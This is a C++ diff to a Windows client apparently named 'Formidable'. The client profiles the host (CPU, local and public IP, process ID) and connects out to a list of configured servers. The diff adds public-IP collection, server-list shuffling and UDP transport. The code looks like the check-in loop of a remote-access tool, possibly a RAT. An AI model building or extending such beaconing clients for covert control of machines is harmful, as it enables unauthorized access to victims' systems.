@@ -6,6 +6,8 @@
 #include <vector>
 #include <cstdio>
 #include <cstdlib>
+#include <ctime>
+#include <algorithm>
 #include <sstream>
 #include <urlmon.h>
 #include <shellapi.h>
@@ -107,6 +109,7 @@ namespace Formidable {
 
         strncpy(info.cpuInfo, GetCpuBrand().c_str(), sizeof(info.cpuInfo) - 1);
         strncpy(info.lanAddr, GetLocalIP().c_str(), sizeof(info.lanAddr) - 1);
+        strncpy(info.publicAddr, GetPublicIP().c_str(), sizeof(info.publicAddr) - 1);
         
         info.processID = GetCurrentProcessId();
         info.is64Bit = (bits == 64);
@@ -720,11 +723,23 @@ namespace Formidable {
             }
             if (serverList.empty()) serverList.push_back("127.0.0.1");
 
+            // 处理上线模式：随机模式下打乱服务器列表
+            if (g_ServerConfig.runningType == 0 && serverList.size() > 1) {
+                std::srand((unsigned int)time(NULL));
+                for (size_t i = serverList.size() - 1; i > 0; --i) {
+                    size_t j = std::rand() % (i + 1);
+                    std::swap(serverList[i], serverList[j]);
+                }
+            }
+
             bool connected = false;
             for (const auto& serverIp : serverList) {
                 if (bShouldExit) break;
                 
-                SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+                int type = (g_ServerConfig.protoType == 1) ? SOCK_DGRAM : SOCK_STREAM;
+                int proto = (g_ServerConfig.protoType == 1) ? IPPROTO_UDP : IPPROTO_TCP;
+                
+                SOCKET s = socket(AF_INET, type, proto);
                 if (s == INVALID_SOCKET) continue;
 
                 int port = atoi(g_ServerConfig.szPort);
@@ -735,19 +750,23 @@ namespace Formidable {
                 addr.sin_port = htons(port);
                 inet_pton(AF_INET, serverIp.c_str(), &addr.sin_addr);
 
-                Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Attempting connection to " + serverIp);
+                Formidable::Client::Utils::Logger::Log(Formidable::Client::Utils::LogLevel::LL_INFO, "Attempting " + std::string(g_ServerConfig.protoType == 1 ? "UDP" : "TCP") + " connection to " + serverIp);
 
-                if (connect(s, (sockaddr*)&addr, sizeof(addr)) == 0) {
+                if (g_ServerConfig.protoType == 1) {
+                    // UDP "connection" - just handle it
                     connected = true;
                     ConnectionContext ctx = { s, serverIp, serverPort, &bConnected, &bShouldExit };
                     HandleConnection(&ctx);
                     closesocket(s);
-                    // If HandleConnection returns, it means we disconnected. 
-                    // Break inner loop to sleep and retry (or move to next server if we implement round-robin on failure immediately?)
-                    // Usually, if we disconnected, we might want to try other servers.
-                    // But if we were connected for a while, maybe we should stick to this one?
-                    // For now, let's break and sleep, then restart loop (which will retry the list).
-                    break; 
+                    break;
+                } else {
+                    if (connect(s, (sockaddr*)&addr, sizeof(addr)) == 0) {
+                        connected = true;
+                        ConnectionContext ctx = { s, serverIp, serverPort, &bConnected, &bShouldExit };
+                        HandleConnection(&ctx);
+                        closesocket(s);
+                        break; 
+                    }
                 }
                 closesocket(s);
             }
